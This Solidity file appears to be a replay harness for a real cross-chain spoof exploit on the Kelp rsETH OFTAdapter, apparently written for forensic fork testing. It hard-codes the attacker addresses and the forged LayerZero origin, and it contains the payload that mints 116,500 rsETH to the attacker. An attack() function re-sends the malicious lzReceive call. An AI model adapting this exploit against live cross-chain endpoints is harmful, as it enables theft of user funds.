// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IEndpointV2, Origin} from "./Tx1ae232Interfaces.sol";

/// @notice Addresses / constants for the Kelp rsETH OFTAdapter cross-chain spoof exploit.
/// @dev    The attacker's on-chain contract is literally an EOA - the exploit is driven
///         entirely by pre-seeded DVN attestations plus `EndpointV2.lzReceive(...)` with
///         the forged (Sonic) origin. The Launcher contract below merely replays that
///         call from a contract context so the Foundry fork harness can assert deltas.
abstract contract Tx1ae232ReplayAddresses {
    address internal constant ENDPOINT_V2 = 0x1a44076050125825900e736c501f859c50fE728c;
    address internal constant ADAPTER    = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3;  // RSETH_OFTAdapter
    address internal constant RSETH      = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;  // rsETH on Ethereum

    address internal constant ATTACKER   = 0x8B1b6c9A6DB1304000412dd21Ae6A70a82d60D3b;  // drain destination
    address internal constant ATTACKER_EOA = 0x4966260619701a80637cDbdAc6A6cE0131f8575E; // submitter EOA

    uint32  internal constant SRC_EID    = 30320;       // LayerZero V2 eid for Sonic mainnet
    uint64  internal constant PACKET_NONCE = 308;
    bytes32 internal constant PACKET_SENDER = bytes32(uint256(uint160(0xc3eACf0612346366Db554C991D7858716db09f58)));
    bytes32 internal constant PACKET_GUID =
        0x3f4510d855cf3a805fec59daafae640d290749b7bf1e5450f91b5fb0018b3b4e;
    bytes32 internal constant PACKET_HASH =
        0xf79a27bb975e38a484124e6f31aad957397b6760a15e522241cd4c372663fef4;

    // OFT SEND payload: abi.encodePacked(bytes32(toAddress), uint64(amountSD))
    //   toAddress = ATTACKER (32B)
    //   amountSD  = 0x1b1ff0ed00 = 116_500_000_000 (shared decimals = 6,
    //               decimalConversionRate = 10**12, LD = 116_500 * 1e18 rsETH)
    bytes internal constant OFT_MESSAGE =
        hex"0000000000000000000000008b1b6c9a6db1304000412dd21ae6a70a82d60d3b0000001b1ff0ed00";
}

contract Tx1ae232ReplayLauncher is Tx1ae232ReplayAddresses {
    error LzReceiveFailed(bytes rtn);

    /// @notice Replays the exact `EndpointV2.lzReceive` call that the attacker
    ///         submitted in tx 0x1ae232da… once the forged DVN attestation
    ///         (tx 0xfe575668…) + commit (tx 0x68eb14e2…) had populated
    ///         `inboundPayloadHash[adapter][30320][sender][308] = PACKET_HASH`.
    function attack() external payable {
        Origin memory origin = Origin({srcEid: SRC_EID, sender: PACKET_SENDER, nonce: PACKET_NONCE});
        IEndpointV2(ENDPOINT_V2).lzReceive{value: msg.value}(
            origin,
            ADAPTER,
            PACKET_GUID,
            OFT_MESSAGE,
            bytes("")
        );
    }

    /// @notice Alias for the harness's `simulate*` slot. In this exploit there is no
    ///         flash-callback variant to bypass, so simulating without flash simply
    ///         re-invokes `attack()`.
    function simulateWithoutFlash(uint256 /*seed*/) external payable {
        this.attack{value: msg.value}();
    }
}
